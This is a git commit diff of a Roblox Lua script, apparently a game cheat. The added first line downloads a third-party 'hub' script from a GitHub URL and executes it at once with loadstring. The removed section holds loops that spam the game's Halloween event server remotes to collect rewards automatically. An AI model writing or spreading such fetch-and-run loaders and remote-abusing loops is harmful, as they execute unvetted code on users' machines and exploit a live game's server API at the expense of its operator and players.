6b3a679e294eed3ea423032d8f7c072325b1a163
darien95 <darien95@gmail.com>
2024-10-30 18:34:44 -0700

    Main.lua

--- Main.lua
+++ Main.lua
@@ -1,3 +1,8 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
+wait(90)
+
+
+
 wait(90)
 
 
@@ -30,33 +35,3 @@ while true do
     executeForPlayers()
     wait(300) -- Wait for 300 seconds (5 minutes)
 end
-
-local locations = {"Neighborhood", "MainMap","SkyCastle","TileSkipMinigame","Halloween2024WhereBear"}
-
-while true do  -- loop infinitely
-    for i = 1, 100 do
-        for _, location in ipairs(locations) do
-            local args = {
-                [1] = location,
-                [2] = tostring(i)
-            }
-            game:GetService("ReplicatedStorage").API:FindFirstChild("HalloweenAPI/PurplePumpkinCollected"):FireServer(unpack(args))
-            wait(0.5)  -- 0.5 second delay prevent crash.. don't remove this to execute faster
-        end
-    end
-    wait(43200)  -- loop every 12h
-end
-
-wait(900)
-
-for i = 1, 18 do
-    local args = { [1] = i }
-    game:GetService("ReplicatedStorage").API:FindFirstChild("HalloweenAPI/PushGravestone"):InvokeServer(unpack(args))
-    wait(1)
-end
-
-
-
-
-
-
